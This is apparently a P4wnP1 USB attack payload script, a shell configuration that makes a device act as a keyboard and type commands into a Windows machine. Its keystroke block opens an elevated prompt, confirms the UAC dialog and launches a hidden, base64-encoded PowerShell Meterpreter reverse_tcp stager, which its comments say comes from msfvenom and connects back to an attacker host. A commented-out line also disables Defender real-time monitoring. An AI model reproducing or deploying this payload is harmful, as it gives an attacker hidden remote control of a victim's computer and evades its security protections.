# Execute Meterpreter via Powershell in memory

# =============================
# USB setup
# =============================
# Make sure to change USB_PID if you enable different USB functionality in order
# to force Windows to enumerate the device again
USB_VID="0x1d6b"        # Vendor ID
USB_PID="0x0137"        # Product ID

# Overwrite default settings (setup.cfg) for keyboard funtion
USE_RNDIS=true          # if true RNDIS will be enabled
USE_HID=true            # if true HID (keyboard) will be enabled

# ==========================
# Network and DHCP options
# ==========================

# We choose an IP with a very small subnet (see comments in README.rst)
IF_IP="172.16.0.1" # IP used by P4wnP1
IF_MASK="255.255.255.252"
IF_DHCP_RANGE="172.16.0.2,172.16.0.3" # DHCP Server IP Rang


# =====================
# Keyboard config
# =====================
# Keyboard language for outhid and duckhid commands
lang="us"
USE_HID_TEST=true

# Payload configuration via HID interface

function onNetworkUp()
{
        echo "Network up"
        echo "Active device $active_interface"
        echo "P4wnP1 IP $IF_IP"
        echo "P4wnP1 netmask $IF_MASK"
        echo "Network is running"

#       cd /home/pi/P4wnP1/webserver
#       php -S 0.0.0.0:80 &
}


function onTargetGotIP()
{
        echo "DHCP Lease given to target"
        echo "Target IP $target_ip"

        # add DNS entry for google DNS
        echo nameserver 8.8.8.8 > /etc/resolv.conf

        echo "Target got IP $target_ip via DHCP"
}


function onKeyboardUp()
{
        # we need no initial keyboard delay, before starting the DuckyScript
        # if this method gets called, we know the HID keyboard stack is usable

        cat <<- EOF | duckhid
                DELAY 3000
                GUI r
                DELAY 1000
                STRING powershell Start-Process cmd -Verb runAs
                DELAY 5000
                ENTER
                DELAY 5000
                ALT y
 #               DELAY 1000
 #               STRING powershell -nop -w hidden "Set-MpPreference -DisableRealtimeMonitoring $true"
 #               DELAY 1000
 #               STRING ENTER
                DELAY 5000
 #              msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e cmd/powershell_base64 --smallest -f powershell -f psh-cmd
                STRING %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAkAHMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwAnAEgANABzAEkAQQBLAG0ARwBVAGwAawBDAEEANwAxAFcAYgBXACsAYgBTAEIARAArAG4ARQByADkARAA2AGkAeQBaAEYAQQBjAEcAeQBkAE8AbQBrAGEAcQBkAEkARABCAGgAdABpAE8AQwBUAFoAMgA3AEwATgBPAEcAQgBiAFkAZQBuAGsAcABMAEwARgBKAHIALwAvADkAQgBoAHMAUwA5ADUAcgBlADkAZgByAGgARQBCAEwANwBNAHIAUAB6AHoARABNAHoATwA3AGgAWgBhAEYATQBjAGgAWQB5AGYAagArADYAeQBSAC8AdABLAHkATABZAHAAOAArAFgAdABtADUATwB4AGwAVgBnAEIAdwA5AFkAeQBJAGIANgBZAFQAVwBiAHUASgBiAEUAYQBUAE0AMwB2AHQAbgBFAHEAYwBDAGMAbgBJAEYARgB6AFIASQBXAC8AWAB6AE0AZgBHAFgAWQBwAHgASABFADMAQwBpAHcAYwByAG0ANQB1AHAAQwB4AEoAVQBFAGcAUAA4ADIAWQBQAFUAUwBGAE4AVQBiAEEAbQBHAEsAVQBzAHgALwB6AEoAegBIAHkAVQBvAEwATwA3ADkAUwBkAGsAVQArAFkATABVAC8AdQBqADIAUwBQAFIAMgBpAEsAbABXAEMANQBaAHQAbwArAFkATQB5AEYAMABpAHIAMQBCAFoARgBzAEYAdwBxAFkAUgBFADAAegBaACsAdQArAC8AMQA3AG4AbABXAFgAdgBWAGwARAA5AG4ARgBrAG4AWgB1AHAARwBuAEYAQQBWAE4AaAA1AEEANgB4ADMAegBsAEMAbwBPAFQAUABFAFoAcwBmAFkAagB0AEoARQBvAGoAbAB6AFoAbgBPAEwAdwA0AGIAMAA3AEQAMQBIAEwAUgBDAEUANQA3AFIARQBOAEUALwBjAGgASgA2AHgAegA0AEEAVwArAEMAYQBKAGEARQBUAE8AbABSAGMAYwBSAEIAZwBLADMARABjAEoAeABFAHQAdQBBADQAQwBVAHAAQgB2AHEAbQBHAGoAOQBFAEcAcwBiAFUAdwBJADYAVABCAC8ATQBZAHUAUwAvAHYAMwBXAFUAaAB4AGcARwBDAGYAbwBpAFMASwBEAFoAUQA4AFkAaAB1AGwAegBiADQAVgBPAGcAVABkAEkAMwBmAEYAagB0AEMAMgBjAHYAdABuAGwAZABoAGoASgBaAEEAYQAwADQAUgByAFEARgBSAGUAQgBUAHEATQBuAEkAeQBnAGcAMgA2AGQAKwB4ADcAcQBjAFMAdwA1AGUARgA3AGkAQwBUAFIAOABmAGYAdgBtADcAUgB1ADMAUwBvAGQAcwBuAGgAMQBuAEEAWQB4AE8AbAB2AHMAeABBAHEARABzAE8ARQByAHgAWAB1AHcAagB3AHoAZQBZAEkAUgBpADAAYQBKAFQAawBNAEsAMQBOAGsAZwB4AHgASwAyAFoAWgBoAEcAQwA1AFcAagBHADEAYQBIAEYASgBQAGsAdgB4AGQAZQBQAEgAWgA3AFEAcgBCAFIAQgBIADIAdgBTADIAMAArAHYATQBMAG0AQgA5AGEAVQBiAFkAVwBZAEYAZQBHAGEAVgBhAFAAdQB5ADcAKwBoAFgAeABpADcAMABmAFoAMQB3AFgAdQBUAGgARQAzAFQAeQAwAEEAbQB4AFgAUwBjAFcAKwB4AGoANQB5AEMAZAByADcAMgA2AHoARQBSAG8AQwBPAHIAWgBjAGIAeQBPAGsAaQBnAGoAeQBMAEYAbQB3ADIAbQBPAFgAMwBhAG4ASwBBADYAYgBPAHUAbQBHAEgAaQBvAEUAUwB3AEkAWQBJAHAAbwBJAEwAZwBjAHQAKwBDAE8AUQBTAEkAcgBhAHYAaABFAEEAVgBBADIARwBGAGUAaAB6AGkANABrAE0AcQBvAGsAaQA3AFQATgA2ACsAcwBGADMATQBRAHEAawB2AEUAUwB0AE0ARwBNADgANgBnAGwAdQB3AEcAWQB5AEMATABJAEsAZgBCAEMARwBHAEsAeQB5ADAAaABvADkARgArAFcASAArAEIATwA4AHcASQB4AGIAYQBWADAAdQBxADQARgBYAGYATQBaAFcAbABUAGkAcwBLAFUASgBwAGsATgBjAFEAVAAvAEoAMABhAE0AYgBHAHkAUgBnAG8ANABHADAAOABjAE8ARQBuAE0ARABlADUAWAB0ACsAcQB0AGsAUwBCAFkAaABPAFAAVABnAHAARQBjAEkAQgBxAHcAVQBKAEIAaQAwAHkASQA0AEUAWQBEADUAbgBBAHQAYwAwAEUARgBXAEQAbQBLAEEAQQA1AFAAYgBGAHIAUgBEAEwAZwAxAEkAdQB5ADIARwBmAFUAcABhAEgAbgBQAHAAcgBTAEsAdQBFAFAAMgBSADMAdwBVAHQARgB5AEIARgBPAEMATABaAEIASQB0AHAAZwBUAEoAeABRAHUAQwBjAEsAagBwADkAVAA2ADkAZQB4AEgARgAwAFYAegA2AGkAawBCAEoAVQB4AFkAcQBzAHkAVwBvAG8ANQBMAGIASwAvAGwAdAAvAE8AbgBXAHYAdABmAGQAKwBjAEYATgBkAGsAeABkAG0AZQBvAFkAUQBDAE8AMABvAFMAQgBhAEsAVgBvAHEAdQBPAFEAUgBQAGcAagBuADMAWABrAG4ASAAzAGMAdAB5AE4AbgBnAFIANABaAE8AVgBlAE4AMABWAGoAYQBpADcAVQBvAGEATQBSAFEANgBYAEcAZwA0AHcASABVADkAOQBYAGMAVgB2ADEAWQBKADUAUABaAFcAOQBNACsAZgBoADIATQB1AGwAcgBSAHIAYwB2AEoATgAyAGQANwB3AHAAcQBxAHMAcAA5AE0AZABmAGIAbwBtAEQAMwA4AFgAdABUAEUANgBkAFQAMABNAFAAUwBRAFAAKwAwAFUAdwBWAEgARABMAHkANQA5AHkAQgB0ADEAYgBFAC8AVgA4AEcAUQBOAFAAQgBVAEQANwA2AGkANgB0AHMAaQB2ACsAQQA5AGsAVgBlAGsAZwBTAEgANgBNAHUAWQBGAHoAOQBEADcAZQBxAGUAOQBVAEYAdgBYAFIATQBSAFAAaABtAG8ASQAvAGQAbQB6AHYAVwBjADcAYwBxAGYAVABuACsAOABtAHcAbQBpAG8AQwBiADUAeQA1AHkAagB0AGMAMgBXAHYAdgB5AG4AMABGADUAdgBlAG8AQwB2AHYANQAzAFkAeAAxAHgAOQBTAEcAYwB0AGcAUgAxAFkAZQBkAE4ATgBIAE0AegBNAFcAWgA3AEsAeQAwAE0AMQBZADkAVQA2ADMAbgBtADQATwBXAGgAMwBGAEYAMgBGAGQAeABiAHQAQgBiAEwAVABnAGEAYgBlADEAeAA5AEIANQBHAHAATAByAHAAeQBIAEEAMQBjADIARgBoAHQARgBDADkAVgBEAHUAQwBiAG8AZwBHAEEAOABoAE0AZABaAGIAUwBSAEEAVgBlADMAdgByAGkAUQB0AFoAbQBjAEwAYQBaAHEASwBHAE8AMwAwAGQARAA1ADMAOABvAGQALwA2AFkAQQA0AHgAaQBpAE4AQgBsAHcAVgBCAEkAVgBDAHoAZwBXAEIAdAB1ADYAMwAyAEwARgBKADAAOAAxAEsAZgB5AHYAdwB1AG4ALwBLADcAcgBmAHkAcAB0AFoAVwB4AHQAdAAyAFUAMwAyAG4AdgA2AHMAcAByAHUAWgAxAHgAeQB6AFQAVQBzAEcALwA1AEkAdQBEAE4AdABjADQARwBhADYAZQB3AEYAMQBnAG0ALwArAEMAMgB6AEkASwAvAHIAaAB5ADIAbgBzAEkANQBzAGMAWgBTAE8AeQBMAHIAVgBuAHUASwB1ACsAOQBGAFUAYwBWAEkARwB3ADEAdAA4AGwAawBFAG4AKwBHAE0AUwAzADAAZABTAGUAZQAyADcAdwBJAG0AMQBiAHYAVwB2AFgAawBVAG4AbABzAGIATwBIAGYAbQBDAFkAQQBPAC8ASQBNADQAdQA1AG8ASwBPAG0ASgBHADgARwBaADYATwBpAC8ATwAwAHIAWgA4AG8ATwAzADQAQQBtAGUAZwBYAFEATwAyADgAeABLAEQAUQBFAE4AMQAzAGcASgA4AFEAcgA5AHIAUwBHAEgAUABVAE8AZgBuAEQAbABMAEUAMQBxAG4AOQA4AFYAMgBSAHYAcABDAC8ATgBlAEsATwBlAHYAagBEAFUAVABiACsAcQBBAGMATgByAFMAVAAxAEwAUQBKAFoAQwBxADIAbAB1AGoAdQBVAEsARgBIAEsASABqAEcATwBjAEsASABCAHMAdAAvADgATwBtAHgAUQBFAGkASQBDADMAUgBiADYAYwBWAFYAOABBAGkARwBSAFgAYgBTAHQAbwBxAHQAQQB4AHoAegAwAHMAUgBWAGMASQBsAE0AWQBYAHAAeQAvAE8AdQBLAFkAWgAwAEgAdQBwAFoAZABWAFMAegBjADMAQwB3AEEATABoAFgAeABVAFkAYwAwAEIAQwBqADMAcQBOAC8AagBkAEIAYwA5AEQAWAArAEoAMwBIAFIANgA4AC8AbgBrAC8AcABTAGoATwAyAGUATQBUAEcAMABWADcASwB4AG4ANwBtAHkAMgB5AHQAOABVAFYAMQBWADUAegBiAHAAUAAvAGgAOAAvAHkAcQB2AEgAaAA0AC8AdwBMAG4AeQA5AHIALwA3AEQANwBVAHgAegB6AGoAWQBxAEIANwB6AGEAKwBYAGYAaABQAFgAUAA4AHkAQgB6AE0ATABVADkAQQB3ADQATABZAGsANgBOAEQAUABYADYAVwBpAHoASwBLAGoAMwB5AEEASQBFACsAUwBHAFcAegA3AEYAbgArAGgAZABSAHMAOQBHADgASABQADAARgB4AHYAZgBhAGkAdwBHAEMAdwBBAEEAJwAnACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7ACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
                DELAY 5000
                ENTER
                DELAY 1000
EOF
}
